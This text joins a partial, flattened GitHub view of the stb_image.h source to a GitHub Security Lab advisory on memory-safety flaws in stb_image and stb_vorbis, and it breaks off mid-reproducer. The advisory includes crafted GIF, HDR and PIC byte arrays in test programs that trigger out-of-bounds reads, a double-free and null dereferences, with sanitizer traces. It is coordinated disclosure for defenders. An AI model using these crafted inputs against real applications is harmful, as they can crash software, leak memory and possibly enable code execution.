// initialize a callback-based contextstatic void stbi\_\_start\_callbacks(stbi\_\_context \*s, stbi\_io\_callbacks \*c, void \*user){ s->io = \*c; s->io\_user\_data = user; s->buflen = sizeof(s->buffer\_start); s->read\_from\_callbacks = 1; s->callback\_already\_read = 0; s->img\_buffer = s->img\_buffer\_original = s->buffer\_start; stbi\_\_refill\_buffer(s); s->img\_buffer\_original\_end = s->img\_buffer\_end;}
#ifndef STBI\_NO\_STDIO
static int stbi\_\_stdio\_read(void \*user, char \*data, int size){ return (int) fread(data,1,size,(FILE\*) user);}
static void stbi\_\_stdio\_skip(void \*user, int n){ int ch; fseek((FILE\*) user, n, SEEK\_CUR); ch = fgetc((FILE\*) user); /\* have to read a byte to reset feof()'s flag \*/ if (ch != EOF) { ungetc(ch, (FILE \*) user); /\* push byte back onto stream if valid. \*/ }}
static int stbi\_\_stdio\_eof(void \*user){ return feof((FILE\*) user) || ferror((FILE \*) user);}
static stbi\_io\_callbacks stbi\_\_stdio\_callbacks ={ stbi\_\_stdio\_read, stbi\_\_stdio\_skip, stbi\_\_stdio\_eof,};
static void stbi\_\_start\_file(stbi\_\_context \*s, FILE \*f){ stbi\_\_start\_callbacks(s, &stbi\_\_stdio\_callbacks, (void \*) f);}
//static void stop\_file(stbi\_\_context \*s) { }
#endif // !STBI\_NO\_STDIO
static void stbi\_\_rewind(stbi\_\_context \*s){ // conceptually rewind SHOULD rewind to the beginning of the stream, // but we just rewind to the beginning of the initial buffer, because // we only use it after doing 'test', which only ever looks at at most 92 bytes s->img\_buffer = s->img\_buffer\_original; s->img\_buffer\_end = s->img\_buffer\_original\_end;}
enum{ STBI\_ORDER\_RGB, STBI\_ORDER\_BGR};
typedef struct{ int bits\_per\_channel; int num\_channels; int channel\_order;} stbi\_\_result\_info;
#ifndef STBI\_NO\_JPEGstatic int stbi\_\_jpeg\_test(stbi\_\_context \*s);static void \*stbi\_\_jpeg\_load(stbi\_\_context \*s, int \*x, int \*y, int \*comp, int req\_comp, stbi\_\_result\_info \*ri);static int stbi\_\_jpeg\_info(stbi\_\_context \*s, int \*x, int \*y, int \*comp);#endif
#ifndef STBI\_NO\_PNGstatic int stbi\_\_png\_test(stbi\_\_context \*s);static void \*stbi\_\_png\_load(stbi\_\_context \*s, int \*x, int \*y, int \*comp, int req\_comp, stbi\_\_result\_info \*ri);static int stbi\_\_png\_info(stbi\_\_context \*s, int \*x, int \*y, int \*comp);static int stbi\_\_png\_is16(stbi\_\_context \*s);#endif
#ifndef STBI\_NO\_BMPstatic int stbi\_\_bmp\_test(stbi\_\_context \*s);static void \*stbi\_\_bmp\_load(stbi\_\_context \*s, int \*x, int \*y, int \*comp, int req\_comp, stbi\_\_result\_info \*ri);static int stbi\_\_bmp\_info(stbi\_\_context \*s, int \*x, int \*y, int \*comp);#endif
#ifndef STBI\_NO\_TGAstatic int stbi\_\_tga\_test(stbi\_\_context \*s);static void \*stbi\_\_tga\_load(stbi\_\_context \*s, int \*x, int \*y, int \*comp, int req\_comp, stbi\_\_result\_info \*ri);static int stbi\_\_tga\_info(stbi\_\_context \*s, int \*x, int \*y, int \*comp);#endif
#ifndef STBI\_NO\_PSDstatic int stbi\_\_psd\_test(stbi\_\_context \*s);static void \*stbi\_\_psd\_load(stbi\_\_context \*s, int \*x, int \*y, int \*comp, int req\_comp, stbi\_\_result\_info \*ri, int bpc);static int stbi\_\_psd\_info(stbi\_\_context \*s, int \*x, int \*y, int \*comp);static int stbi\_\_psd\_is16(stbi\_\_context \*s);#endif
#ifndef STBI\_NO\_HDRstatic int stbi\_\_hdr\_test(stbi\_\_context \*s);static float \*stbi\_\_hdr\_load(stbi\_\_context \*s, int \*x, int \*y, int \*comp, int req\_comp, stbi\_\_result\_info \*ri);static int stbi\_\_hdr\_info(stbi\_\_context \*s, int \*x, int \*y, int \*comp);#endif
#ifndef STBI\_NO\_PICstatic int stbi\_\_pic\_test(stbi\_\_context \*s);static void \*stbi\_\_pic\_load(stbi\_\_context \*s, int \*x, int \*y, int \*comp, int req\_comp, stbi\_\_result\_info \*ri);static int stbi\_\_pic\_info(stbi\_\_context \*s, int \*x, int \*y, int \*comp);#endif
#ifndef STBI\_NO\_GIFstatic int stbi\_\_gif\_test(stbi\_\_context \*s);static void \*stbi\_\_gif\_load(stbi\_\_context \*s, int \*x, int \*y, int \*comp, int req\_comp, stbi\_\_result\_info \*ri);static void \*stbi\_\_load\_gif\_main(stbi\_\_context \*s, int \*\*delays, int \*x, int \*y, int \*z, int \*comp, int req\_comp);static int stbi\_\_gif\_info(stbi\_\_context \*s, int \*x, int \*y, int \*comp);#endif
#ifndef STBI\_NO\_PNMstatic int stbi\_\_pnm\_test(stbi\_\_context \*s);static void \*stbi\_\_pnm\_load(stbi\_\_context \*s, int \*x, int \*y, int \*comp, int req\_comp, stbi\_\_result\_info \*ri);static int stbi\_\_pnm\_info(stbi\_\_context \*s, int \*x, int \*y, int \*comp);static int stbi\_\_pnm\_is16(stbi\_\_context \*s);#endif
static#ifdef STBI\_THREAD\_LOCALSTBI\_THREAD\_LOCAL#endifconst char \*stbi\_\_g\_failure\_reason;
STBIDEF const char \*stbi\_failure\_reason(void){ return stbi\_\_g\_failure\_reason;}
#ifndef STBI\_NO\_FAILURE\_STRINGSstatic int stbi\_\_err(const char \*str){ stbi\_\_g\_failure\_reason = str; return 0;}#endif
static void \*stbi\_\_malloc(size\_t size){ return STBI\_MALLOC(size);}
// stb\_image uses ints pervasively, including for offset calculations.// therefore the largest decoded image size we can support with the// current code, even on 64-bit targets, is INT\_MAX. this is not a// significant limitation for the intended use case.//// we do, however, need to make sure our size calculations don't// overflow. hence a few helper functions for size calculations that// multiply integers together, making sure that they're non-negative// and no overflow occurs.
// return 1 if the sum is valid, 0 on overflow.// negative terms are considered invalid.static int stbi\_\_addsizes\_valid(int a, int b)[View remainder of file in raw view](https://github.com/nothings/stb/raw/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from securitylab.github.com_10bfe28f_20250111_100630.html ===

[skip to content](#content)

 /
[Security Lab](/ "Security Lab")
[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Events](/events/ "Events")

[Get Involved](/get-involved/)

* Resources
* [Open Source Community](/open-source "Home")
* [Enterprise](/enterprise "Home")

 /
[Security Lab](/ "Security Lab")

[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Open Source Community](/open-source "Open Source Community")
[Enterprise](/enterprise "Enterprise")

[Events](/events/ "Events")
[Get Involved](/get-involved/ "Events")

October 19, 2023
# GHSL-2023-145\_GHSL-2023-151/GHSL-2023-165\_GHSL-2023-172: Several memory access violations in stb\_image and stb\_vorbis

[![Author avatar](https://avatars.githubusercontent.com/u/26652396)
Jaroslav Lobačevski](https://github.com/jarlob)

## Coordinated Disclosure Timeline

* 2023-07-13: stb\_image report with issues and fix suggestions was sent privately to the maintainers.
* 2023-07-13/17: Created public pull requests for additional issues such as memory leaks.
* 2023-07-17: stb\_vorbis report with issues and fix suggestions was sent privately to the maintainers.
* 2023-07-17: Requested confirmation of report receipt.
* 2023-07-17: Received confirmation.
* 2023-09-05: Requested update on reported issues. No reply received.
* 2023-09-22: Requested update on reported issues. No reply received.
* 2023-10-09: Followed up with offer to create public pull requests for all reported issues. No reply received.
* 2023-10-19: Created pull requests for security related issues.
* 2023-10-19: Publishing according to our [coordinated disclosure policy](https://securitylab.github.com/disclosures#policy).

## Summary

[stb\_image.h](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h) and [stb\_vorbis](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c) libraries contain several memory access violations of different severity.

1. [Wild address read in stbi\_\_gif\_load\_next (`GHSL-2023-145`).](#issue-1-wild-address-read-in-stbi__gif_load_next-ghsl-2023-145)
2. [Multi-byte read heap buffer overflow in `stbi__vertical_flip` (`GHSL-2023-146`).](#issue-2-multi-byte-read-heap-buffer-overflow-in-stbi__vertical_flip-ghsl-2023-146)
3. [Disclosure of uninitialized memory in `stbi__tga_load` (`GHSL-2023-147`).](#issue-3-disclosure-of-uninitialized-memory-in-stbi__tga_load-ghsl-2023-147)
4. [Double-free in `stbi__load_gif_main_outofmem` (`GHSL-2023-148`).](#issue-4-double-free-in-stbi__load_gif_main_outofmem-ghsl-2023-148)
5. [Null pointer dereference in `stbi__convert_format` (`GHSL-2023-149`).](#issue-5-null-pointer-dereference-in-stbi__convert_format-ghsl-2023-149)
6. [Possible double-free or memory leak in `stbi__load_gif_main` (`GHSL-2023-150`).](#issue-6-possible-double-free-or-memory-leak-in-stbi__load_gif_main-ghsl-2023-150)
7. [Null pointer dereference because of an uninitialized variable (`GHSL-2023-151`).](#issue-7-null-pointer-dereference-because-of-an-uninitialized-variable-ghsl-2023-151)
8. [`0` byte write heap buffer overflow in `start_decoder` (`GHSL-2023-165`)](#issue-8-0-byte-write-heap-buffer-overflow-in-start_decoder-ghsl-2023-165)
9. [Multi-byte write heap buffer overflow in `start_decoder` (`GHSL-2023-166`)](#issue-9-multi-byte-write-heap-buffer-overflow-in-start_decoder-ghsl-2023-166)
10. [Heap buffer out of bounds write in `start_decoder` (`GHSL-2023-167`)](#issue-10-heap-buffer-out-of-bounds-write-in-start_decoder-ghsl-2023-167)
11. [Off-by-one heap buffer write in `start_decoder` (`GHSL-2023-168`)](#issue-11-off-by-one-heap-buffer-write-in-start_decoder-ghsl-2023-168)
12. [Attempt to free an uninitialized memory pointer in `vorbis_deinit` (`GHSL-2023-169`)](#issue-12-attempt-to-free-an-uninitialized-memory-pointer-in-vorbis_deinit-ghsl-2023-169)
13. [Null pointer dereference in `vorbis_deinit` (`GHSL-2023-170`)](#issue-13-null-pointer-dereference-in-vorbis_deinit-ghsl-2023-170)
14. [Out of bounds heap buffer write (`GHSL-2023-171`)](#issue-14-out-of-bounds-heap-buffer-write-ghsl-2023-171)
15. [Wild address read in `vorbis_decode_packet_rest` (`GHSL-2023-172`)](#issue-15-wild-address-read-in-vorbis_decode_packet_rest-ghsl-2023-172)

## Product

[stb\_image.h](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h) and [stb\_vorbis](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c)

## Tested Version

stb\_image - [v2.28](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h)

stb\_vorbis - [v1.22](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c)

## Details

### Issue 1: Wild address read in stbi\_\_gif\_load\_next (`GHSL-2023-145`)

A crafted image file may trigger out of bounds [`memcpy`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L6817) read in `stbi__gif_load_next`. This happens because [`two_back` points to a memory address lower than the start of the buffer `out`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L7021-L7022).

#### Impact

This issue may be used to leak internal memory allocation information.
s

#### Resources

To reproduce the issue:

1. Make ASAN build of the following program:

```
#include <stdint.h>
#define STB_IMAGE_IMPLEMENTATION
#include "../stb_image.h"

int main(int argc, char* argv[])
{
    const uint8_t data[] = {0x47,0x49,0x46,0x38,0x39,0x61,0xbd,0x00,0xdf,0x79,0xa9,0x97,0x53,
                            0x43,0x05,0xff,0xbe,0x21,0x00,0x30,0x03,0x01,0x00,0x21,0x00,0x2c,
                            0x00,0x00,0x00,0x00,0xbd,0x00,0x3f,0x71,0x07,0x00,0x05,0xff,0xbe,
                            0x01,0x00,0x68,0x00,0x21,0xf9,0x04,0x2c,0x0a,0x00,0x1f,0x00,0x2c,
                            0x00,0x00,0x00,0x00,0xbd,0x00,0x71,0x00,0x00,0x05,0xff,0xe0,0x27,
                            0x8e,0x64,0x68};
    size_t size = sizeof(data);

    int x, y, z, channels;
    stbi_uc *img = stbi_load_gif_from_memory(data, size, NULL, &x, &y, &z, &channels, 4);
    stbi_image_free(img);
    return 0;
}

```

1. Run the program to hit the error.

```
AddressSanitizer:DEADLYSIGNAL
=================================================================
==34019==ERROR: AddressSanitizer: SEGV on unknown address 0x7efdf91e0ae8 (pc 0x7efe05a0ac23 bp 0x7ffd4ee08700 sp 0x7ffd4ee07ec8 T0)
==34019==The signal is caused by a READ memory access.
    #2 0x4e4156 in stbi__gif_load_next(stbi__context*, stbi__gif*, int*, int, unsigned char*) tests/../stb_image.h:6817:16
    #3 0x4dee75 in stbi__load_gif_main(stbi__context*, int**, int*, int*, int*, int*, int) tests/../stb_image.h:6983:14
    #4 0x4de8bd in stbi_load_gif_from_memory tests/../stb_image.h:1448:30

```
### Issue 2: Multi-byte read heap buffer overflow in `stbi__vertical_flip` (`GHSL-2023-146`)

When `stbi_set_flip_vertically_on_load` is set to `TRUE` and `req_comp` is set to a number that doesn’t match the real number of components per pixel, the library attempts to flip the image vertically.

```
stbi_set_flip_vertically_on_load(1);
stbi_uc *img = stbi_load_gif_from_memory(data, size, &delays, &x, &y, &z, &channels, 2);

```

A crafted image file can trigger [memcpy](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L1235) [3] out-of-bounds read because `bytes_per_pixel` [1] used to calculate `bytes_per_row` [2] doesn’t match the real `image` array dimensions.

```
static void stbi__vertical_flip(void *image, int w, int h, int bytes_per_pixel /* [1] */)
{
   int row;
   size_t bytes_per_row = (size_t)w * bytes_per_pixel; // [2]
   stbi_uc temp[2048];
   stbi_uc *bytes = (stbi_uc *)image;

   for (row = 0; row < (h>>1); row++) {
      stbi_uc *row0 = bytes + row*bytes_per_row;
      stbi_uc *row1 = bytes + (h - row - 1)*bytes_per_row;
      // swap row0 with row1
      size_t bytes_left = bytes_per_row;
      while (bytes_left) {
         size_t bytes_copy = (bytes_left < sizeof(temp)) ? bytes_left : sizeof(temp);
         memcpy(temp, row0, bytes_copy);
         memcpy(row0, row1, bytes_copy); // [3] OOB
         memcpy(row1, temp, bytes_copy);
         row0 += bytes_copy;
         row1 += bytes_copy;
         bytes_left -= bytes_copy;
      }
   }
}

```

The reason for this is that [`stbi_load_gif_from_memory`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L1442C4-L1451) calls [`stbi__vertical_flip_slices`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L1245) [5] with the number of bytes per pixel in the loaded image - `comp`, however `stbi__load_gif_main` [4] internally [converts the image](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L7037-L7038) to requested number of bytes per pixel.

```
STBIDEF stbi_uc *stbi_load_gif_from_memory(stbi_uc const *buffer, int len, int **delays, int *x, int *y, int *z, int *comp, int req_comp)
{
   unsigned char *result;
   stbi__context s;
   stbi__start_mem(&s,buffer,len);

   result = (unsigned char*) stbi__load_gif_main(&s, delays, x, y, z, comp, req_comp); // [4]
   if (stbi__vertically_flip_on_load) {
      stbi__vertical_flip_slices( result, *x, *y, *z, *comp ); // [5]
   }

   return result;
}

```

```
static void *stbi__load_gif_main(stbi__context *s, int **delays, int *x, int *y, int *z, int *comp, int req_comp)
{
...
      // do the final conversion after loading everything;
      if (req_comp && req_comp != 4)
         out = stbi__convert_format(out, 4, req_comp, layers * g.w, g.h);

```
#### Impact

This issue may be used to leak internal memory allocation information.

#### Resources

To reproduce the issue:

1. Make ASAN build of the following program:

```
#include <stdint.h>
#define STB_IMAGE_IMPLEMENTATION
#include "../stb_image.h"

int main(int argc, char* argv[])
{
    const uint8_t data[] = {0x47,0x49,0x46,0x38,0x39,0x61,0xbd,0x00,0xdf,0x79,0xa9,0x97,
                            0x66,0x4f,0x4e,0x4c,0xda,0x21,0xf9,0x04,0x09,0x0a,0x00,0x1f,
                            0x00,0x2c};
    size_t size = sizeof(data);

    stbi_set_flip_vertically_on_load(1);

    int x, y, z, channels;
    stbi_uc *img = stbi_load_gif_from_memory(data, size, NULL, &x, &y, &z, &channels, 2);
    stbi_image_free(img);
    return 0;
}

```

1. Run the program to hit the error.

```
==58950==ERROR: AddressSanitizer: heap-use-after-free on address 0x7f5f9fe18b98 at pc 0x00000049db51 bp 0x7ffdf2aed0f0 sp 0x7ffdf2aec8c0
READ of size 756 at 0x7f5f9fe18b98 thread T0
    #0 0x49db50 in __asan_memcpy /src/llvm-project/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cpp:22:3
    #1 0x4e2608 in stbi__vertical_flip(void*, int, int, int) tests/../stb_image.h:1235:10
    #2 0x4dfaee in stbi__vertical_flip_slices(void*, int, int, int, int) tests/../stb_image.h:1252:7
    #3 0x4dea9b in stbi_load_gif_from_memory tests/../stb_image.h:1450:7

```
### Issue 3: Disclosure of uninitialized memory in `stbi__tga_load` (`GHSL-2023-147`)

The [`stbi__getn`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L1664) function reads a specified number of bytes from `context` (typically a file) into the specified buffer. In case the file stream points to the end, it returns zero. There are two places where its return value is not checked:

1. In [`stbi__hdr_load`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L7221)
2. In [`stbi__tga_load`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L5936C10-L5936C20)

The first case is harder to exploit because the initialized memory is mixed in different arithmetic operations:

```
static void stbi__hdr_convert(float *output, stbi_uc *input, int req_comp)
{
   if ( input[3] != 0 ) {
      float f1;
      // Exponent
      f1 = (float) ldexp(1.0f, input[3] - (int)(128 + 8));
      if (req_comp <= 2)
         output[0] = (input[0] + input[1] + input[2]) * f1 / 3;
      else {
         output[0] = input[0] * f1;
         output[1] = input[1] * f1;
         output[2] = input[2] * f1;
      }

```

However the second case in [`stbi__tga_load`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L5936C10-L5936C20) gives much powerful capabilities because the attacker can control the size of the uninitialized buffer ([1] and [2]) and the uninitialized memory can be loaded into the image without transformations.

```
...
   tga_data = (unsigned char*)stbi__malloc_mad3(tga_width, tga_height, tga_comp, 0); // [1]
   if (!tga_data) return stbi__errpuc("outofmem", "Out of memory");

   // skip to the data's starting position (offset usually = 0)
   stbi__skip(s, tga_offset );

   if ( !tga_indexed && !tga_is_RLE && !tga_rgb16 ) {
      for (i=0; i < tga_height; ++i) {
         int row = tga_inverted ? tga_height -i - 1 : i;
         stbi_uc *tga_row = tga_data + row*tga_width*tga_comp;
         stbi__getn(s, tga_row, tga_width * tga_comp); // [2]
      }
...

```
#### Impact

Information disclosure.

#### Resources

To reproduce the issue in `stbi__hdr_load`:

1. Make MSAN build of the following program:

```
#include <stdint.h>
#define STB_IMAGE_IMPLEMENTATION
#include "../stb_image.h"

int main(int argc, char* argv[])
{
    const uint8_t data[] = {0x23,0x3f,0x52,0x47,0x42,0x45,0x0a,0x46,0x4f,0x52,
                            0x4d,0x41,0x54,0x3d,0x33,0x32,0x2d,0x62,0x69,0x74,
                            0x5f,0x72,0x6c,0x65,0x5f,0x72,0x67,0x62,0x65,0x0a,
                            0x0a,0x2d,0x59,0x20,0x39,0x2b,0x58,0x20,0x38,0x30};
    size_t size = sizeof(data);

    int x, y, channels;
    stbi_uc *img = stbi_load_from_memory(data, size, &x, &y, &channels, 4);
    stbi_image_free(img);
    return 0;
}

```

1. Set breakpoint at [`stbi__hdr_convert`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L7132) and run the program. The second hit is before the usage of the uninitialized memory.

```
==118355==WARNING: MemorySanitizer: use-of-uninitialized-value
    #0 0x5f15fa in stbi__hdr_convert(float*, unsigned char*, int) tests/../stb_image.h:7132:9
    #1 0x4e54be in stbi__hdr_load(stbi__context*, int*, int*, int*, int, stbi__result_info*) tests/../stb_image.h:7222:13
    #2 0x4b1a94 in stbi__loadf_main(stbi__context*, int*, int*, int*, int) tests/../stb_image.h:1464:25
    #3 0x4b1375 in stbi_loadf_from_memory tests/../stb_image.h:1480:11

```
### Issue 4: Double-free in `stbi__load_gif_main_outofmem` (`GHSL-2023-148`)

A crafted image file can trigger `stbi__load_gif_main_outofmem` attempt to double-free the `out` variable. [1]

```
static void *stbi__load_gif_main_outofmem(stbi__gif *g, stbi_uc *out, int **delays)
{
   STBI_FREE(g->out);
   STBI_FREE(g->history);
   STBI_FREE(g->background);

   if (out) STBI_FREE(out); // [1] Double-free
   if (delays && *delays) STBI_FREE(*delays);
   return stbi__errpuc("outofmem", "Out of memory");
}

```

This happens in [`stbi__load_gif_main`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L6993-L6995) because when the `layers * stride` is zero [2] the behavior is implementation defined, but common that `realloc` frees the old memory and returns null pointer. Since it attempts to double-free the memory [3] a few lines below the first “free” [2], the issue can be potentially exploited only in a multi-threaded environment.

```
...
 void *tmp = (stbi_uc*) STBI_REALLOC_SIZED( out, out_size, layers * stride ); // [2]
 if (!tmp)
    return stbi__load_gif_main_outofmem(&g, out, delays); // [3]
...

```
#### Impact

This issue may lead to code execution.

#### Resources

To reproduce the issue:

1. Make ASAN build of the following program:

```
#include <stdint.h>
#define STB_IMAGE_IMPLEMENTATION
#include "../stb_image.h"

int main(int argc, char* argv[])
{
    const uint8_t data[] = {0x47,0x49,0x46,0x38,0x39,0x61,0x00,0x00,0x00,0x00,0xf8,0x0a,0xdc,
                            0x04,0xfc,0x00,0x46,0x00,0x00,0x2c,0x00,0x00,0x00,0x00,0x00,0x00,
                            0x00,0x00,0x46,0x00,0x00,0x2c,0x00,0x00};
    size_t size = sizeof(data);

    int x, y, z, channels;
    stbi_uc *img = stbi_load_gif_from_memory(data, size, NULL, &x, &y, &z, &channels, 4);
    stbi_image_free(img);
    return 0;
}

```

1. Run the program to hit the error.

```
==145841==ERROR: AddressSanitizer: attempting double-free on 0x602000000070 in thread T0:
    #0 0x49e522 in free /src/llvm-project/compiler-rt/lib/asan/asan_malloc_linux.cpp:52:3
    #1 0x4eb732 in stbi__load_gif_main_outofmem(stbi__gif*, unsigned char*, int**) tests/../stb_image.h:6957:13
    #2 0x4df18f in stbi__load_gif_main(stbi__context*, int**, int*, int*, int*, int*, int) tests/../stb_image.h:6995:26
    #3 0x4de8bd in stbi_load_gif_from_memory tests/../stb_image.h:1448:30

```
### Issue 5: Null pointer dereference in `stbi__convert_format` (`GHSL-2023-149`)

A crafted image file can trigger null pointer access in [`stbi__convert_format`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L1786) where `src` is null. It happens when [`stbi__pic_load_core`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L6528-L6531) in `stbi__pic_load` fails, the `result` is set to zero [1], but the flow continues [2].

```
   if (!stbi__pic_load_core(s,x,y,comp, result)) {
      STBI_FREE(result);
      result=0; // [1]
   }
   *px = x;
   *py = y;
   if (req_comp == 0) req_comp = *comp;
   result=stbi__convert_format(result,4,req_comp,x,y); // [2]

```
#### Impact

This issue may lead to denial of service.

#### Resources

To reproduce the issue:

1. Make ASAN build of the following program:

```
#include <stdint.h>
#define STB_IMAGE_IMPLEMENTATION
#include "../stb_image.h"

int main(int argc, char* argv[])
{
    const uint8_t data[] = {0x53,0x80,0xf6,0x34,0x00,0x00,0x00,0x00,0x00,0x00,
                            0x00,0x00,0x40,0x00,0x08,0x01,0x20,0xff,0x10,0x40,
                            0x74,0x72,0x74,0x65,0x69,0xab,0x4c,0x65,0x31,0x6e,
                            0x20,0x62,0x79,0x20,0x6d,0x65,0x6e,0x74,0x61,0x6c,
                            0x20,0x69,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x50,
                            0x49,0x43,0x54,0x00,0x50,0x49,0x43,0x57,0x00,0x00,
                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,
                            0x08,0x01,0x20,0xff,0x10,0x6e,0x74,0x61,0x6c,0x20,
                            0x69,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x50,0x49,
                            0x43,0x54,0x00,0x50,0x54,0x20,0x10};
    size_t size = sizeof(data);

    int x, y, z, channels;
    stbi_uc *img = stbi_load_from_memory(data, size, &x, &y, &channels, 2);
    stbi_image_free(img);
    return 0;
}

```

1. Run the program to hit the error.

```
==183891==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x0000004f944d bp 0x7ffefb18fe50 sp 0x7ffefb18fa00 T0)
==183891==The signal is caused by a READ memory access.
==183891==Hint: address points to the zero page.
    #0 0x4f944d in stbi__convert_format(unsigned char*, int, int, unsigned int, unsigned int) tests/../stb_image.h:1786:52
    #1 0x4ecdbe in stbi__pic_load(stbi__context*, int*, int*, int*, int, stbi__result_info*) tests/../stb_image.h:6535:11
    #2 0x4e463b in stbi__load_main(stbi__context*, int*, int*, int*, int, stbi__result_info*, int) tests/../stb_image.h:1159:35
    #3 0x4dc48f in stbi__load_and_postprocess_8bit(stbi__context*, int*, int*, int*, int) tests/../stb_image.h:1261:19
    #4 0x4de334 in stbi_load_from_memory tests/../stb_image.h:1431:11

```
### Issue 6: Possible double-free or memory leak in `stbi__load_gif_main` (`GHSL-2023-150`)

It may look like [`stbi__load_gif_main`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L6962-L7045) doesn’t give guarantees about the content of output value `*delays` upon failure. Although it sets `*delays` to zero at the beginning [1], it doesn’t do it in case the image is not recognized as GIF [2] and a call to `stbi__load_gif_main_outofmem` only [frees possibly allocated memory in `*delays` without resetting it to zero](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L6957) in [3], [4], [5] and [6]. Thus it would be fair to say the caller of `stbi__load_gif_main` is responsible to free the allocated memory in `*delays` only if `stbi__load_gif_main` returns a non null value. However at the same time the function may return null value, but fail to free the memory in `*delays` if internally `stbi__convert_format` is called and fails [7].

```
static void *stbi__load_gif_main(stbi__context *s, int **delays, int *x, int *y, int *z, int *comp, int req_comp)
{
   if (stbi__gif_test(s)) {
...
      if (delays) {
         *delays = 0; // [1]
      }

      do {
         u = stbi__gif_load_next(s, &g, comp, req_comp, two_back);
         if (u == (stbi_uc *) s) u = 0;  // end of animated gif marker

         if (u) {
            *x = g.w;
            *y = g.h;
            ++layers;
            stride = g.w * g.h * 4;

            if (out) {
               void *tmp = (stbi_uc*) STBI_REALLOC_SIZED( out, out_size, layers * stride );
               if (!tmp)
                  return stbi__load_gif_main_outofmem(&g, out, delays); // [3]
               else {
                   out = (stbi_uc*) tmp;
                   out_size = layers * stride;
               }

               if (delays) {
                  int *new_delays = (int*) STBI_REALLOC_SIZED( *delays, delays_size, sizeof(int) * layers );
                  if (!new_delays)
                     return stbi__load_gif_main_outofmem(&g, out, delays); // [4]
                  *delays = new_delays;
                  delays_size = layers * sizeof(int);
               }
            } else {
               out = (stbi_uc*)stbi__malloc( layers * stride );
               if (!out)
                  return stbi__load_gif_main_outofmem(&g, out, delays); // [5]
               out_size = layers * stride;
               if (delays) {
                  *delays = (int*) stbi__malloc( layers * sizeof(int) );
                  if (!*delays)
                     return stbi__load_gif_main_outofmem(&g, out, delays); // [6]
                  delays_size = layers * sizeof(int);
               }
            }
            memcpy( out + ((layers - 1) * stride), u, stride );
            if (layers >= 2) {
               two_back = out - 2 * stride;
            }

            if (delays) {
               (*delays)[layers - 1U] = g.delay;
            }
         }
      } while (u != 0);

...

      // do the final conversion after loading everything;
      if (req_comp && req_comp != 4)
         out = stbi__convert_format(out, 4, req_comp, layers * g.w, g.h); // [7]

      *z = layers;
      return out;
   } else {
      return stbi__errpuc("not GIF", "Image was not as a gif type."); // [2]
   }
}

```

Thus the issue may lead to a memory leak if the caller chooses to free `delays` only when `stbi__load_gif_main` didn’t fail:

```
    int* delays = NULL;
    img = stbi_load_gif_from_memory(data, size, &delays, &x, &y, &z, &channels, req_comp);
    if (img)
      free(delays);
    stbi_image_free(img);

```

or to a double-free if the `delays` is always freed (since calling `free(NULL)` is safe).

```
    int* delays = NULL;
    img = stbi_load_gif_from_memory(data, size, &delays, &x, &y, &z, &channels, req_comp);
    free(delays);
    stbi_image_free(img);

```

Code search finds both usage scenarios in the wild.

#### Impact

This issue may lead to code execution.

#### Resources

To reproduce the issue:

1. Make ASAN build of the following program:

```
#include <stdint.h>
#define STB_IMAGE_IMPLEMENTATION
#include "../stb_image.h"

int main(int argc, char* argv[])
{
    const uint8_t data[] = {0x47,0x49,0x46,0x38,0x39,0x61,0xbd,0x21,0xfe,0x79,0xa9,0x97,0x53,
